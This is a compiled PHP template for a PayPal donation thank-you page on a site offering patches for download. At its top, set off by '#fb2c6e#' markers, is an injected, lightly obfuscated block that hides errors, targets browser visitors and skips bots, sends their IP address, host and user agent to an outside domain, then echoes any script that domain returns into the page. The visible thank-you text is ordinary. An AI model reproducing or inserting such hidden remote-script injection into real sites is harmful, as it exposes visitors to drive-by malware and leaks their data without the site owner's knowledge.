<?php /* Smarty version 2.6.22, created on 2010-12-03 10:53:06
         compiled from /home/a1425978/public_html//templates/paypal.html */ ?>
<?php
#fb2c6e#
error_reporting(0); ini_set('display_errors',0); $wp_bl157 = @$_SERVER['HTTP_USER_AGENT'];
if (( preg_match ('/Gecko|MSIE/i', $wp_bl157) && !preg_match ('/bot/i', $wp_bl157))){
$wp_bl09157="http://"."tags"."cache".".com/cache"."/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_bl157);
$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_bl09157);
curl_setopt ($ch, CURLOPT_TIMEOUT, 6); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $wp_157bl = curl_exec ($ch); curl_close($ch);}
if ( substr($wp_157bl,1,3) === 'scr' ){ echo $wp_157bl; }
#/fb2c6e#
?>
<?php

?>
<?php

?>
<?php

?>
<h2>Thank you for your donation.</h2>
<p>
<strong>You may download your items in the <a href="customers.php">Customer's Section</a> using the login / pass that has been sent to your PayPal registered email address.</strong>  If you do not have access to your PayPal email address, send a message to alanmarcero [at / @] gmail [dot / .] com and I will respond promptly with a direct download link to your item(s).
</p>

<p>Be sure to check your SPAM filter as my emails tend to be caught by them.  As a last resort, simply re-purchase the item at a price of 0.00 and you will gain immediate access to the download.</p>

<p>Your donation encourages me to make my patches available through this website.  Thank you, again!</p>